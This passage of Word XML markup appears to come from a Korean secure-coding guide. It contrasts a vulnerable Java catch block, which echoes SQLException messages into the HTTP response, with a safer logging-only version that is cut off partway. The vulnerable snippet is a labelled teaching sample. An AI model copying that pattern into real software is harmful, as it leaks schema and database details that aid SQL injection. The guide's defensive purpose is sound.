          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예외</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>메시지를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>응답에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>catch (SQLException e) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    response.getWriter().write("DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>오류</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>: " + e.getMessage());</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    // e.getMessage()</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>쿼리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>테이블명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>컬럼명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">SQLException </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>메시지에는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>테이블명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>컬럼명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>·</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿼리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>구조</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">·DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>버전이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>응답에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>출력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> SQL </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>인젝션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>대상을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정확히</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파악하고</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>최적화된</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿼리를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>작성할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>오류는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그에만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>기록</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자에게는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>일반</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>메시지만</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전달</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>catch (SQLException e) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    log.error("DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
